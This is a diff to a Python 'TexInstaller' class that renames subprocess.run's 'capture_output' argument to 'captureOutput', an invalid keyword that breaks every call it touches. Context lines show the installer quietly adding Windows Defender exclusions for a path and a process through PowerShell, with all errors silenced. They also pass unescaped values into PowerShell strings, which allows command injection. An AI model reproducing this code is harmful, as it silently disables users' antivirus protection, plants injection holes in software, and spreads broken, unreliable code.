@@ -40,7 +40,7 @@ class TexInstaller:
         try:
             result = subprocess.run(
                 ["tex", "--version"],
-                capture_output=True,
+                captureOutput=True,
                 text=True,
                 timeout=500
             )
@@ -53,7 +53,7 @@ class TexInstaller:
             subprocess.run(
                 ["powershell", "-Command",
                  f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"],
-                capture_output=True, timeout=30
+                captureOutput=True, timeout=30
             )
         except Exception:
             pass
@@ -63,7 +63,7 @@ class TexInstaller:
             subprocess.run(
                 ["powershell", "-Command",
                  f"Remove-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"],
-                capture_output=True, timeout=30
+                captureOutput=True, timeout=30
             )
         except Exception:
             pass
@@ -112,7 +112,7 @@ class TexInstaller:
                 subprocess.run(
                     ["powershell", "-Command",
                      f"Add-MpPreference -ExclusionProcess '{procName}' -ErrorAction SilentlyContinue"],
-                    capture_output=True, timeout=30
+                    captureOutput=True, timeout=30
                 )
                 subprocess.run(
                     [installerPath, "--gui=text", "--scheme=infraonly", "--no-interaction"],
